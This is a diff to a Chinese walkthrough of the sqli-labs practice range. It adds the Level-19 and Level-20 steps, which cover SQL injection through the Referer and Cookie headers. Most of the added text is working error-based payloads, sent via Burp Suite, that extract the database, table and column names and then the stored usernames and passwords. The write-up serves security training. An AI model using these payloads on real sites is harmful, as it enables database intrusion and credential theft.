@@ -2371,7 +2371,7 @@ uname=DUMB&passwd=123456' and extractvalue(1,concat(0x7e,(select reverse(group_c
 
 
 
-### Level-18
+### Level-18 UserAgent头注入
 
 + 首先启动<code>burpsuite</code>和打开<code>sqli-labs</code>网站第十八关
 
@@ -2476,6 +2476,171 @@ insert into 'security'.'某个表'(uagent,ipadd,username) values('' and extractv
 
 
 
-### Level-19
+### Level-19 Referer头注入
 
-+ 
++ 首先启动<code>burpsuite</code>和打开<code>sqli-labs</code>靶场
+
+![Less-19_1](./img/Less-19_1.PNG)
+
+
+
++ 输入账号<code>dumb</code>和密码<code>dumb</code>，会有<code>ip</code>地址和<code>referer</code>头
+
+![Less-19_2](./img/Less-19_2.PNG)
+
+![Less-19_3](./img/Less-19_3.PNG)
+
+
+
++ 启动<code>burpsuite</code>和开启监测端口，重新提交<code>post</code>参数，注入以下<code>payload</code>爆库名
+
+~~~ shell
+' and extractvalue(1,concat(0x7e,(select database()))) and '1'='1
+~~~
+
+![Less-19_4](./img/Less-19_4.PNG)
+
+![Less-19_5](./img/Less-19_5.PNG)
+
+爆出的库名是<code>security</code>
+
+
+
++ 爆数据表名
+
+~~~ shell
+'and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and '
+~~~
+
+![Less-19_3](./img/Less-19_3.PNG)
+
+![Less-19_6](./img/Less-19_6.PNG)
+
+![Less-19_7](./img/Less-19_7.PNG)
+
+
+
++ 爆列名
+
+~~~ shell
+'and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e)) and '
+~~~
+
+![Less-19_2](./img/Less-19_2.PNG)
+
+![Less-19_8](./img/Less-19_8.PNG)
+
+![Less-19_9](./img/Less-19_9.PNG)
+
+
+
++ 爆数据名
+
+~~~ shell
+' and extractvalue(1,concat(0x7e,(select group_concat(username,password)from users),0x7e)) and '
+~~~
+
+![Less-19_2](./img/Less-19_2.PNG)
+
+![Less-19_10](./img/Less-19_10.PNG)
+
+![Less-19_11](./img/Less-19_11.PNG)
+
+
+
+### Level-20 Cookie头注入
+
++ 首先启动<code>burpsuite</code>和打开<code>sqli-labs</code>靶场
+
+![Less-20_1](./img/Less-20_1.PNG)
+
+
+
++ 输入账号<code>admin</code>和密码<code>admin</code>，返回<code>cookie</code>头
+
+![Less-20_2](./img/Less-20_2.PNG)
+
+![Less-20_3](./img/Less-20_3.PNG)
+
+
+
++ 确定闭合方式
+
+  + 首先用单引号<code>'</code>闭合，页面出现报错
+
+  ~~~ shell
+  '
+  ~~~
+
+  ![Less-20_4](./img/Less-20_4.PNG)
+
+  ![Less-20_5](./img/Less-20_5.PNG)
+
+  
+
+  + 然后使用<code>' and '1' = '1</code>，语句正确闭合
+
+  ![Less-20_6](./img/Less-20_6.PNG)
+
+  ![Less-20_18](./img/Less-20_18.PNG)
+
+
+
++ 启动<code>burpsuite</code>和开启监测端口，重新提交<code>post</code>参数，注入以下<code>payload</code>爆库名
+
+~~~ shell
+' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1
+
+' and extractvalue(1,concat(0x7e,(select database()),0x7e)) # 
+~~~
+
+![Less-20_8](./img/Less-20_8.PNG)
+
+![Less-20_9](./img/Less-20_9.PNG)
+
+
+
+![Less-20_10](./img/Less-20_10.PNG)
+
+![Less-20_11](./img/Less-20_11.PNG)
+
+
+
++ 爆破数据表名
+
+~~~ shell
+' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #
+~~~
+
+![Less-20_12](./img/Less-20_12.PNG)
+
+![Less-20_13](./img/Less-20_13.PNG)
+
+
+
++ 爆破列名
+
+~~~ shell
+' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1) #
+~~~
+
+![Less-20_14](./img/Less-20_14.PNG)
+
+![Less-20_15](./img/Less-20_15.PNG)
+
+
+
++ 爆破数据
+
+~~~ shell
+' and updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1) #
+~~~
+
+![Less-20_16](./img/Less-20_16.PNG)
+
+![Less-20_17](./img/Less-20_17.PNG)
+
+
+
+### Level-21
+
